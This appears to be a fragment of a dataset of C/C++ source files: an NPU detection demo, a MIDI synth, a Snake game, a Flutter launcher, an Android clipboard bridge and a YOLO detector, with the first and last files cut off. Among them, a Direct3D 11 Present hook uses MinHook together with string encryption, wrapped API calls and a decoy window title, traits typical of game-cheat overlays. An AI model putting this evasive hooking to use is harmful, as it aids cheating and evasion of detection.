[image path]\\n\");\r\n        return -1;\r\n    }\r\n\r\n    AX_S32 ret = AX_SKEL_SUCC;\r\n    AX_SKEL_INIT_PARAM_T stInitParam = {0};\r\n    const AX_SKEL_VERSION_INFO_T *pstVersionInfo = nullptr;\r\n    AX_SKEL_HANDLE_PARAM_T stHandleParam;\r\n    AX_SKEL_HANDLE handle;\r\n    AX_SKEL_FRAME_T frame = {0};\r\n    const char* filename = argv[1];\r\n    AX_SKEL_RESULT_T *pstResult = nullptr;\r\n    AX_SKEL_CONFIG_T stConfig = {0};\r\n    bool bUseCallback = true;\r\n\r\n    memset(&stHandleParam, 0, sizeof(AX_SKEL_HANDLE_PARAM_T));\r\n\r\n    ret = AX_SYS_Init();\r\n    if (0 != ret) {\r\n        printf(\"AX_SYS_Init failed! ret = 0x%x\\n\", ret);\r\n        return -1;\r\n    }\r\n\r\n    AX_ENGINE_NPU_ATTR_T attr;\r\n    memset(&attr, 0, sizeof(AX_ENGINE_NPU_ATTR_T));\r\n    attr.eHardMode = AX_ENGINE_VIRTUAL_NPU_DISABLE;\r\n    ret = AX_ENGINE_Init(&attr);\r\n    if (ret != 0)\r\n    {\r\n        printf(\"AXEngine init failed! ret={0x%8x}\\n\", ret);\r\n        return -1;\r\n    }\r\n\r\n    frame.nStreamId = 0;\r\n    frame.nFrameId = 0;\r\n    frame.pUserData = NULL;\r\n    ret = ReadFrame(frame.stFrame, filename, \"hvcfp\", AX_FORMAT_YUV420_SEMIPLANAR);\r\n    if (AX_SKEL_SUCC != ret) {\r\n        printf(\"ReadFrame failed! ret = 0x%x\\n\", ret);\r\n        FreeFrame(frame.stFrame);\r\n        AX_SKEL_DeInit();\r\n        return -1;\r\n    }\r\n\r\n    stInitParam.pStrModelDeploymentPath = \"../../../models\";\r\n    ret = AX_SKEL_Init(&stInitParam);\r\n    if (AX_SKEL_SUCC != ret) {\r\n        printf(\"AX_SKEL_Init failed! ret = 0x%x\\n\", ret);\r\n        FreeFrame(frame.stFrame);\r\n        AX_SKEL_DeInit();\r\n        return -1;\r\n    }\r\n\r\n    stHandleParam.ePPL = AX_SKEL_PPL_HVCFP;\r\n    ret = AX_SKEL_Create(&stHandleParam, &handle);\r\n    if (AX_SKEL_SUCC != ret) {\r\n        printf(\"AX_SKEL_Create failed! ret = 0x%x\\n\", ret);\r\n        FreeFrame(frame.stFrame);\r\n        AX_SKEL_DeInit();\r\n        return -1;\r\n    }\r\n\r\n    printf(\"create handle success\\n\");\r\n\r\n    {\r\n        // set config\r\n        MakeConfig(&stConfig, \"track_disable\", false);\r\n\r\n        ret = AX_SKEL_SetConfig(handle, &stConfig);\r\n        if (AX_SKEL_SUCC != ret) {\r\n            printf(\"AX_SKEL_SetConfig failed! ret = 0x%x\\n\", ret);\r\n            FreeFrame(frame.stFrame);\r\n            AX_SKEL_Destroy(handle);\r\n            AX_SKEL_DeInit();\r\n            return -1;\r\n        }\r\n    }\r\n\r\n    {\r\n        // Get config\r\n        AX_SKEL_CONFIG_T *pstConfig = nullptr;\r\n        ret = AX_SKEL_GetConfig(handle, (const AX_SKEL_CONFIG_T**)&pstConfig);\r\n        if (AX_SKEL_SUCC != ret) {\r\n            printf(\"AX_SKEL_GetConfig failed! ret = 0x%x\\n\", ret);\r\n            FreeFrame(frame.stFrame);\r\n            AX_SKEL_Destroy(handle);\r\n            AX_SKEL_DeInit();\r\n            return -1;\r\n        }\r\n    }\r\n\r\n    if (bUseCallback) {\r\n        ret = AX_SKEL_RegisterResultCallback(handle, HvcfpResultCallback, (void*)filename);\r\n        if (AX_SKEL_SUCC != ret) {\r\n            printf(\"AX_SKEL_RegisterResultCallback failed! ret = 0x%x\\n\", ret);\r\n            FreeFrame(frame.stFrame);\r\n            AX_SKEL_Destroy(handle);\r\n            AX_SKEL_DeInit();\r\n            return -1;\r\n        }\r\n    }\r\n\r\n    ret = AX_SKEL_SendFrame(handle, &frame, -1);\r\n    if (AX_SKEL_SUCC != ret) {\r\n        printf(\"AX_SKEL_SendFrame failed! ret = 0x%x\\n\", ret);\r\n        FreeFrame(frame.stFrame);\r\n        AX_SKEL_Destroy(handle);\r\n        AX_SKEL_DeInit();\r\n        return -1;\r\n    }\r\n\r\n    FreeFrame(frame.stFrame);\r\n\r\n    if (!bUseCallback) {\r\n        ret = AX_SKEL_GetResult(handle, &pstResult, -1);\r\n        if (AX_SKEL_SUCC != ret) {\r\n            printf(\"AX_SKEL_GetResult failed! ret = 0x%x\\n\", ret);\r\n            AX_SKEL_Destroy(handle);\r\n            AX_SKEL_DeInit();\r\n            return -1;\r\n        }\r\n\r\n        printf(\"Detected %d objects\\n\", pstResult->nObjectSize);\r\n\r\n        cv::Mat result_img = Dr",
    "#include <daisy_seed.h>\n\n#include <algorithm>\n#include <span>\n\n#include \"phasedist.h\"\n#include \"vult_daisy.hpp\"\n\nvult2daisy(Phasedist);\n\nusing namespace daisy;\n\nDaisySeed hw;\nMidiUsbHandler midi;\nPhasedist voice;\n\n/** Function that gets called at a regular interval by the hardware to\n *  process, and/or generate audio signals\n */\nvoid AudioCallback(AudioHandle::InputBuffer in, AudioHandle::OutputBuffer out,\n                   size_t size) {\n  voice.ProcessBlock({&in[0][0], size}, {&out[0][0], size});\n}\n\nvoid HandleMidi() {\n  /** Listen to MIDI for new changes */\n  midi.Listen();\n\n  /** When there are messages waiting in the queue... */\n  while (midi.HasEvents()) {\n    /** Pull the oldest one from the list... */\n    auto msg = midi.PopEvent();\n    switch (msg.type) {\n      case NoteOn:\n        voice.NoteOn(msg.AsNoteOn());\n        break;\n\n      case NoteOff:\n        voice.NoteOff(msg.AsNoteOff());\n        break;\n\n      case ControlChange:\n        voice.ControlChange(msg.AsControlChange());\n        break;\n\n      default:\n        break;\n    }\n  }\n}\n\nint main(void) {\n  /** Basic initialization of Daisy hardware */\n  hw.Configure();\n  hw.Init();\n\n  /** Initialize USB Midi\n   *  by default this is set to use the built in (USB FS) peripheral.\n   *\n   *  by setting midi_cfg.transport_config.periph =\n   * MidiUsbTransport::Config::EXTERNAL the USB HS pins can be used (as FS)\n   * for MIDI\n   */\n  MidiUsbHandler::Config midi_cfg;\n  midi_cfg.transport_config.periph = MidiUsbTransport::Config::INTERNAL;\n  midi.Init(midi_cfg);\n\n  /** Initialize our test tone */\n  voice.Init();\n\n  /** And start the audio callback */\n  hw.StartAudio(AudioCallback);\n\n  while (1) {\n    HandleMidi();\n  }\n}\n",
    "#include <raylib.h>\n#include <deque>\n#include <raymath.h>\n#include <iostream>\n\nusing namespace std;\n\nColor green = {173,204,96,255};\nColor darkGreen = {43,51,24,255};\n\nint cellSize = 30;\nint cellCount = 25;\nint offset = 60;\ndouble speed = 1;\ndouble lastUpdateTime = 0.0;\n\nbool elementInDeque(Vector2 element, deque<Vector2> deque){\n    for (unsigned int i = 0; i < deque.size(); i++)\n    {\n        if(Vector2Equals(element, deque[i])){\n            return true;\n        }\n    }\n    return false;\n}\n\n\nbool eventTriggred(double interval){\n    double currentTime = GetTime();\n    if(currentTime - lastUpdateTime > interval){\n        lastUpdateTime = currentTime;\n        return true;\n    }\n    return false;\n}\n\n\nclass Snake{\n    public :\n        deque<Vector2> body = {Vector2{6,9}, Vector2{5,9}, Vector2{4,9}};\n        Vector2 direction =  {1,0};\n        bool addSegment = false;\n    void Draw(){\n        for (unsigned int i = 0; i < body.size(); i++)\n        {\n            float x = body[i].x;\n            float y = body[i].y;\n            Rectangle segmant = Rectangle{offset+ x * cellSize, offset+ y * cellSize,   (float)cellSize,(float)cellSize};\n            DrawRectangleRounded(segmant,0.5 , 6, darkGreen);\n        }\n    }\n    void Update(){\n        body.push_front(Vector2Add(body[0], direction));\n\n        if (addSegment){\n            //body.push_back(body.back());\n            addSegment = false;\n        }\n        else{\n            body.pop_back();\n        }\n\n    }\n\n    void Reset(){\n        body = {Vector2{6,9}, Vector2{5,9}, Vector2{4,9}};\n        direction =  {1,0};\n    }\n};\nclass Food\n{\npublic:\n    Vector2 postion;\n    Texture2D texture;\n\n    Food(deque<Vector2> SnakeBody){\n        Image image = LoadImage(\"assets/food.png\");\n        texture = LoadTextureFromImage(image);\n        UnloadImage(image);\n        postion = GenerateRandomPos(SnakeBody);\n    }\n    ~Food(){\n        UnloadTexture(texture);\n    }\n    void Draw(){\n        // DrawRectangle(postion.x * cellSize, postion.y * cellSize, cellSize, cellSize, darkGreen);\n        DrawTexture(texture, offset+ postion.x * cellSize, offset+ postion.y * cellSize, WHITE);\n    }\n\n    Vector2 GenerateRandomCell(){\n        float x = GetRandomValue(0, cellCount - 1);\n        float y = GetRandomValue(0, cellCount - 1);\n        return Vector2 {x,y};\n    }\n\n    /**\n     * Generates a random position within the range specified by cellCount.\n     *\n     * @return Vector2 the randomly generated position\n     */\n    Vector2 GenerateRandomPos(deque<Vector2> SnakeBody){\n        Vector2 postion = GenerateRandomCell();\n        while(elementInDeque(postion, SnakeBody)){\n            postion = GenerateRandomCell();\n        }\n        return postion;\n    }\n};\n\nclass Game\n{\npublic:\n    Food food = Food(snake.body);\n    Snake snake = Snake();\n    bool running = true;\n    int score = 0;\n    void Draw(){\n        snake.Draw();\n        food.Draw();\n    }\n    void Update(){\n        if (running) {\n            snake.Update();\n            CheckCollisionWithFood();\n            CheckCollisionWithEdges();\n            // CheckCollisionWithSelf();\n        }\n    }\n    void CheckCollisionWithFood(){\n        if(Vector2Equals(snake.body[0], food.postion)){\n            food.postion = food.GenerateRandomPos(snake.body);\n            cout << \"Food Eaten!\"<< endl;\n            snake.addSegment = true;\n            score++;\n            cout << \"Score: \" << score << endl;\n        }\n    }\n    void CheckCollisionWithEdges(){\n        if(snake.body[0].x == -1 || snake.body[0].x == cellCount || snake.body[0].y == -1 || snake.body[0].y == cellCount){\n            GameOver();\n        }\n    }\n\n    void CheckCollisionWithSelf(){\n        deque<Vector2> headless = snake.body;\n        headless.pop_front();\n        if (elementInDeque(snake.body[0], headless)){\n            GameOver();\n        }\n    }\n    \n    void GameOver(){\n        cout << \"Game Over!\" << endl;\n        running = false;\n        snake.Reset();\n        food.postion = food.GenerateRandomPos(snake.body);\n        score = 0;\n    }\n};\n\nint main()\n{\n    InitWindow(2*offset + cellSize * cellCount, 2*offset +cellSize * cellCount, \"Snake game by wesamdev | v1\");\n    SetTargetFPS(60);\n    Game game = Game();\n    while (!WindowShouldClose())\n    {\n        BeginDrawing();\n        ClearBackground(green);\n        if (eventTriggred(speed)){\n            if(IsKeyDown(KEY_UP) && game.snake.direction.y != 1){\n                game.snake.direction = {0,-1};\n                game.running = true;\n            }\n            if(IsKeyDown(KEY_DOWN) && game.snake.direction.y != -1){\n                game.snake.direction = {0,1};\n                game.running = true;\n\n            }\n            if(IsKeyDown(KEY_LEFT) && game.snake.direction.x != 1){\n                game.snake.direction = {-1,0};\n                game.running = true;\n\n            }\n            if(IsKeyDown(KEY_RIGHT) && game.snake.direction.x != -1){\n                game.snake.direction = {1,0};\n                game.running = true;\n            ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rest_api_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <dmsdk/sdk.h>\r\n#include \"clipboard_private.h\"\r\n\r\n#if defined(DM_PLATFORM_ANDROID)\r\n\r\n\r\nstatic JNIEnv* Attach()\r\n{\r\n\tJNIEnv* env;\r\n\tJavaVM* vm = dmGraphics::GetNativeAndroidJavaVM();\r\n\tvm->AttachCurrentThread(&env, NULL);\r\n\treturn env;\r\n}\r\n\r\nstatic bool Detach(JNIEnv* env)\r\n{\r\n\tbool exception = (bool) env->ExceptionCheck();\r\n\tenv->ExceptionClear();\r\n\tJavaVM* vm = dmGraphics::GetNativeAndroidJavaVM();\r\n\tvm->DetachCurrentThread();\r\n\treturn !exception;\r\n}\r\n\r\nnamespace {\r\n\tstruct AttachScope {\r\n\t\tJNIEnv* m_Env;\r\n\t\tAttachScope() : m_Env(Attach()) {\r\n\t\t}\r\n\t\t~AttachScope() {\r\n\t\t\tDetach(m_Env);\r\n\t\t}\r\n\t};\r\n}\r\n\r\nstatic jclass GetClass(JNIEnv* env, const char* classname)\r\n{\r\n\tjclass activity_class = env->FindClass(\"android/app/NativeActivity\");\r\n\tjmethodID get_class_loader = env->GetMethodID(activity_class,\"getClassLoader\", \"()Ljava/lang/ClassLoader;\");\r\n\tjobject cls = env->CallObjectMethod(dmGraphics::GetNativeAndroidActivity(), get_class_loader);\r\n\tjclass class_loader = env->FindClass(\"java/lang/ClassLoader\");\r\n\tjmethodID find_class = env->GetMethodID(class_loader, \"loadClass\", \"(Ljava/lang/String;)Ljava/lang/Class;\");\r\n\r\n\tjstring str_class_name = env->NewStringUTF(classname);\r\n\tjclass outcls = (jclass)env->CallObjectMethod(cls, find_class, str_class_name);\r\n\tenv->DeleteLocalRef(str_class_name);\r\n\treturn outcls;\r\n}\r\n\r\n\r\nvoid clipboard_to_clipboard(const char* text) {\r\n\t// prepare JNI\r\n\tAttachScope attachscope;\r\n\tJNIEnv* env = attachscope.m_Env;\r\n\tjclass cls = GetClass(env, \"com.britzl.defold.clipboard.ClipboardExtension\");\r\n\r\n\t// call method\r\n\tjmethodID to_clipboard = env->GetStaticMethodID(cls, \"ToClipboard\", \"(Landroid/app/Activity;Ljava/lang/String;)V\");\r\n\tenv->CallStaticVoidMethod(cls, to_clipboard, dmGraphics::GetNativeAndroidActivity(), env->NewStringUTF(text));\r\n}\r\n\r\nconst char* clipboard_from_clipboard() {\r\n\t// prepare JNI\r\n\tAttachScope attachscope;\r\n\tJNIEnv* env = attachscope.m_Env;\r\n\tjclass cls = GetClass(env, \"com.britzl.defold.clipboard.ClipboardExtension\");\r\n\r\n\t// call method\r\n\tjmethodID from_clipboard = env->GetStaticMethodID(cls, \"FromClipboard\", \"(Landroid/app/Activity;)Ljava/lang/String;\");\r\n\tjstring s = (jstring)env->CallStaticObjectMethod(cls, from_clipboard, dmGraphics::GetNativeAndroidActivity());\r\n\r\n\tconst char *str = env->GetStringUTFChars(s, 0);\r\n\treturn str;\r\n}\r\n\r\n#endif\r\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include\"yolo.h\"\nusing namespace std;\nusing namespace cv;\nusing namespace cv::dnn;\n\nbool Yolo::readModel(Net& net, string& netPath, bool isCuda = false) {\n\ttry {\n\t\tnet = readNet(netPath);\n\t}\n\tcatch (const std::exception&) {\n\t\treturn false;\n\t}\n\t//cuda\n\tif (isCuda) {\n\t\tnet.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\n\t\tnet.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\n\t}\n\t//cpu\n\telse {\n\t\tnet.setPreferableBackend(cv::dnn::DNN_BACKEND_DEFAULT);\n\t\tnet.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\n\t}\n\treturn true;\n}\n#if(defined YOLOV5 && YOLOV5==false)  //yolov7\nbool Yolo::Detect(Mat& SrcImg, Net& net, vector<Output>& output) {\n\tMat blob;\n\tint col = SrcImg.cols;\n\tint row = SrcImg.rows;\n\tint maxLen = MAX(col, row);\n\tMat netInputImg = SrcImg.clone();\n\tif (maxLen > 1.2 * col || maxLen > 1.2 * row) {\n\t\tMat resizeImg = Mat::zeros(maxLen, maxLen, CV_8UC3);\n\t\tSrcImg.copyTo(resizeImg(Rect(0, 0, col, row)));\n\t\tnetInputImg = resizeImg;\n\t}\n\tvector<Ptr<Layer> > layer;\n\tvector<string> layer_names;\n\tlayer_names= net.getLayerNames();\n\tblobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(0, 0, 0), true, false);\n\t//\u5982\u679c\u5728\u5176\u4ed6\u8bbe\u7f6e\u6ca1\u6709\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u4f46\u662f\u7ed3\u679c\u504f\u5dee\u5f88\u5927\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e0b\u7528\u4e0b\u9762\u4e24\u53e5\u8bed\u53e5\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(104, 117, 123), true, false);\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(114, 114,114), true, false);\n\tnet.setInput(blob);\n\tstd::vector<cv::Mat> netOutputImg;\n\tnet.forward(netOutputImg, net.getUnconnectedOutLayersNames());\n\tstd::vector<int> classIds;//\u7ed3\u679cid\u6570\u7ec4\n\tstd::vector<float> confidences;//\u7ed3\u679c\u6bcf\u4e2aid\u5bf9\u5e94\u7f6e\u4fe1\u5ea6\u6570\u7ec4\n\tstd::vector<cv::Rect> boxes;//\u6bcf\u4e2aid\u77e9\u5f62\u6846\n\tfloat ratio_h = (float)netInputImg.rows / netHeight;\n\tfloat ratio_w = (float)netInputImg.cols / netWidth;\n\tint net_width = className.size() + 5;  //\u8f93\u51fa\u7684\u7f51\u7edc\u5bbd\u5ea6\u662f\u7c7b\u522b\u6570+5\n\tfor (int stride = 0; stride < strideSize; stride++) {    //stride\n\t\tfloat* pdata = (float*)netOutputImg[stride].data;\n\t\tint grid_x = (int)(netWidth / netStride[stride]);\n\t\tint grid_y = (int)(netHeight / netStride[stride]);\n\t\tfor (int anchor = 0; anchor < 3; anchor++) {\t//anchors\n\t\t\tconst float anchor_w = netAnchors[stride][anchor * 2];\n\t\t\tconst float anchor_h = netAnchors[stride][anchor * 2 + 1];\n\t\t\tfor (int i = 0; i < grid_y; i++) {\n\t\t\t\tfor (int j = 0; j < grid_x; j++) {\n\t\t\t\t\tfloat box_score = sigmoid_x(pdata[4]); ;//\u83b7\u53d6\u6bcf\u4e00\u884c\u7684box\u6846\u4e2d\u542b\u6709\u67d0\u4e2a\u7269\u4f53\u7684\u6982\u7387\n\t\t\t\t\tif (box_score >= boxThreshold) {\n\t\t\t\t\t\tcv::Mat scores(1, className.size(), CV_32FC1, pdata + 5);\n\t\t\t\t\t\tPoint classIdPoint;\n\t\t\t\t\t\tdouble max_class_socre;\n\t\t\t\t\t\tminMaxLoc(scores, 0, &max_class_socre, 0, &classIdPoint);\n\t\t\t\t\t\tmax_class_socre = sigmoid_x(max_class_socre);\n\t\t\t\t\t\tif (max_class_socre >= classThreshold) {\n\t\t\t\t\t\t\tfloat x = (sigmoid_x(pdata[0]) * 2.f - 0.5f + j) * netStride[stride];  //x\n\t\t\t\t\t\t\tfloat y = (sigmoid_x(pdata[1]) * 2.f - 0.5f + i) * netStride[stride];   //y\n\t\t\t\t\t\t\tfloat w = powf(sigmoid_x(pdata[2]) * 2.f, 2.f) * anchor_w;   //w\n\t\t\t\t\t\t\tfloat h = powf(sigmoid_x(pdata[3]) * 2.f, 2.f) * anchor_h;  //h\n\t\t\t\t\t\t\tint left = (int)(x - 0.5 * w) * ratio_w + 0.5;\n\t\t\t\t\t\t\tint top = (int)(y - 0.5 * h) * ratio_h + 0.5;\n\t\t\t\t\t\t\tclassIds.push_back(classIdPoint.x);\n\t\t\t\t\t\t\tconfidences.push_back(max_class_socre * box_score);\n\t\t\t\t\t\t\tboxes.push_back(Rect(left, top, int(w * ratio_w), int(h * ratio_h)));\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tpdata += net_width;//\u4e0b\u4e00\u884c\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t//\u6267\u884c\u975e\u6700\u5927\u6291\u5236\u4ee5\u6d88\u9664\u5177\u6709\u8f83\u4f4e\u7f6e\u4fe1\u5ea6\u7684\u5197\u4f59\u91cd\u53e0\u6846\uff08NMS\uff09\n\tvector<int> nms_result;\n\tNMSBoxes(boxes, confidences, nmsScoreThreshold, nmsThreshold, nms_result);\n\tfor (int i = 0; i < nms_result.size(); i++) {\n\t\tint idx = nms_result[i];\n\t\tOutput result;\n\t\tresult.id = classIds[idx];\n\t\tresult.confidence = confidences[idx];\n\t\tresult.box = boxes[idx];\n\t\toutput.push_back(result);\n\t}\n\tif (output.size())\n\t\treturn true;\n\telse\n\t\treturn false;\n}\n#else\n\t//yolov5\nbool Yolo::Detect(Mat& SrcImg, Net& net, vector<Output>& output) {\n\tMat blob;\n\tint col = SrcImg.cols;\n\tint row = SrcImg.rows;\n\tint maxLen = MAX(col, row);\n\tMat netInputImg = SrcImg.clone();\n\tif (maxLen > 1.2 * col || maxLen > 1.2 * row) {\n\t\tMat resizeImg = Mat::zeros(maxLen, maxLen, CV_8UC3);\n\t\tSrcImg.copyTo(resizeImg(Rect(0, 0, col, row)));\n\t\tnetInputImg = resizeImg;\n\t}\n\tvector<Ptr<Layer> > layer;\n\tvector<string> layer_names;\n\tlayer_names = net.getLayerNames();\n\tblobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(0, 0, 0), true, false);\n\t//\u5982\u679c\u5728\u5176\u4ed6\u8bbe\u7f6e\u6ca1\u6709\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u4f46\u662f\u7ed3\u679c\u504f\u5dee\u5f88\u5927\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e0b\u7528\u4e0b\u9762\u4e24\u53e5\u8bed\u53e5\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(104, 117, 123), true, false);\n\t//blobFromImage(netInputImg, blob, 1 / 255.0, cv::Size(netWidth, netHeight), cv::Scalar(114, 114,114), true, false);\n\tnet.setInput(blob);\n\tstd::vector<cv::Mat> netOutputImg;\n\tnet.forward(netOutputImg, net.getUnconnectedOutLayersNames());\n\tstd::vector<int> classIds;//\u7ed3\u679cid\u6570\u7ec4\n\tstd::vector<float> confidences;//\u7ed3\u679c\u6bcf\u4e2aid\u5bf9\u5e94\u7f6e\u4fe1\u5ea6\u6570\u7ec4\n\tstd::vector<cv::Rect> boxes;//\u6bcf\u4e2aid\u77e9\u5f62\u6846\n\tfloat ratio_h = (float)netInputImg.rows / netHeight;\n\tfloat ratio_w = (float)netInputImg.cols / netWidth;\n\tint net_",
